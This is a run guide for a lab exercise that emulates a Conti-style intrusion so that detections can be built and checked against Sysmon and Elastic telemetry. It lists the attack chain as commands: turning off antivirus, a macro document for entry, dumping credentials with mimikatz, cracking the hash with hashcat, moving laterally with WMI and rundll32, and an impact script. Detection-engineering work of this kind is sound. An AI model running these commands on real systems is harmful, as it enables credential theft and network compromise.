# C0015 — Full campaign run guide (phases 1→3), start to finish

One continuous pass under ONE `run_id`. Replace every `RUN-<…>` with your actual id. Machine tags: **[KALI]**,
**[C2]** = lab host 192.168.50.1, **[WS01]** = 192.168.50.20 (duc.user), **[FS01]** = 192.168.50.30.

Automation: `payloads/packaging/run_campaign_orchestrator.ps1` (C2 host) + `payloads/packaging/run_ws01_operator.ps1`
(WS01 interactive steps). Only these need a human at the keyboard: Kali builds, AV disable, S0 seed, opening
test.docm, and the runas/net-use password prompts.

---

## Phase 0 — build + environment (once)

**[KALI]**
```bash
cd C0015-Conti-Detection-Lab
./payloads/packaging/build_dll.sh
x86_64-w64-mingw32-gcc -shared -o c0015_143_surrogate.dll payloads/dll/c0015_143_surrogate.c -luser32 -lshlwapi
git clone https://github.com/ParrotSec/mimikatz      # x64/mimikatz.exe (verify hash)
```
Copy `c0015_143_surrogate.dll` + `mimikatz.exe` into `stage/ws01/` (and onto WS01, e.g. `C:\stage\`).

**[WS01 / FS01]** — AV permanent off (tamper protection OFF first, then policy+prefs from `docs/attack-runbook.md`
step 4), Sysmon BALANCED, `it.admin` ∈ local Administrators on WS01 **and** FS01, `wmic` present on WS01.
**[C2]** — Defender exclusion for the workspace already configured; ensure the repo is on `main` at the reviewed
commit (`git pull`).

## Phase 1 — entry → bootstrap → session 1 (S1–S3)

**[C2]**
```powershell
pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -RunId RUN-20260928-02 -Action Pre
# -> sinh config + config-phase7 (sua run_id tay), start C2-SIM v3 + HTTP :8000
```
**[WS01]**
```powershell
# S0 SEED (IT da login WS01 trong "qua khu") — GIU CUA SO MO toi khi xong S9
runas /user:C0015\it.admin "cmd /c ping -t 127.0.0.1"
# stage + macro + open
powershell -ExecutionPolicy Bypass -File .\stage_ws01.ps1 -Source C:\stage
powershell -ExecutionPolicy Bypass -File .\install_macro_docm.ps1 -MacroSource .\macro_payload.vba
# mo test.docm (Enable Content) — 1 lan
```
**[C2]** — check session 1 came up, then hand control to phase 2:
```powershell
pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -RunId RUN-20260928-02 -Action P1
# REGISTER OK + marker checklist + token
pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -RunId RUN-20260928-02 -Action P2
# -> tu dong: runbook 11 entries (discovery + share probe), cho run xong, tao artifact templates
```

## Phase 2 — operator: credential access → WMI pivot → session 2 (S4–S9)

`-Action P2` chạy xong phần beacon thì in các bước tay. Làm theo đúng thứ tự:

**[WS01]** — `payloads/packaging/run_ws01_operator.ps1 -RunId RUN-…` (S7 → S7b → S8a → S8b), cụ thể:
```
S7   net use \FS01\IPC$ /user:duc.user *        (denied)
     net use \FS01\IPC$ /user:it.admin *        (allowed — GIU ket noi)
     net use \FS01\IPC$ /user:<revoked> *       (denied)
S7b  runas /user:C0015\it.admin "C:\Tools\mimikatz.exe sekurlsa::logonpasswords"
     -> chep NTLM hash it.admin -> CRACK tren Kali: hashcat -m 1000 <hash> rockyou.txt (hoac john)
     -> giu PLAINTEXT CRACKED trong bo nho (khong ghi file/log)
S8a  copy 143.dll + beacon + config-phase7 -> \\FS01\C$\C0015\
S8b  runas /user:C0015\it.admin "cmd /c wmic /node:FS01 process call create \"rundll32.exe C:\C0015\c0015_143_surrogate.dll,LabEntry\""
     (dung plaintext CRACKED tai prompt; neu khong co wmic: Invoke-CimMethod -Credential, ghi PARTIAL)
```
**[C2]** — trong lúc đó tạo artifacts (template đã sinh ở `stage/ws01/*.json`, điền TBD):
```powershell
pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -RunId RUN-20260928-02 -Action Artifacts
# ART-04-01, ART-04-02, ART-05-01, ART-06-01 (4 lệnh artifact-new in ra; điền sha256 LogonId... trước khi chạy)
```
`-Action P2` sẽ tự **chờ receipt `ART-07-01`** (session 2 trên FS01) rồi in kết quả.
Verify Elastic: FS01 E1 rundll32 (cùng ProcessGuid S8b) → E7 hash=ART-06-01 → E11 `c0015_143-executed.txt` → E3 `:8080`; WS01 E10 lsass + S4648.

## Phase 3 — collection/transfer/RDP/impact (S10–S14, guided)

```powershell
pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -RunId RUN-20260928-02 -Action P3   # in ra các bước
```
- **S10** (FS01, session2): đọc corpus `\\FS01\IT` → manifest: `python scripts/lab_tools.py manifest-new <corpus> RUN-… -o stage\ws01\art08_01.json`
- **S11** (transfer): sink `p5_sink` **chưa có trong repo** — muốn chạy cần sink trước; offline dùng `lab_tools.py receipt-check <receipt> <manifest> <allowlist>`.
- **S12** (RDP): `mstsc /v:FS01` (it.admin) — cần DET-008 định nghĩa.
- **S13** (AnyDesk-like): thủ công — portable app vào path đặc biệt; nhánh LSASS = fixtures/replay.
- **S14** (impact, trên FS01 có bản repo):
  ```powershell
  pwsh -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <m> -Action Prepare
  pwsh -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <m> -Action Run
  pwsh -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <m> -Action Verify
  pwsh -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <m> -Action Rollback
  pwsh -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <m> -Action Verify
  ```

## Verify + cleanup

```powershell
pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -Action Stop
# WS01/FS01: xoa C:\Users\Public\C0015, test.docm, C:\C0015, C:\Tools\mimikatz.exe; Ctrl+C cuaso S0
# bat lai Defender (gõ policy + Tamper Protection); ghi ledger S1-S15; S15: lab_tools.py score
```
Per-stage verification queries + join keys: `docs/phase2-detection-prep-s4-s9.md` + `docs/run-phase2-checklist.md`.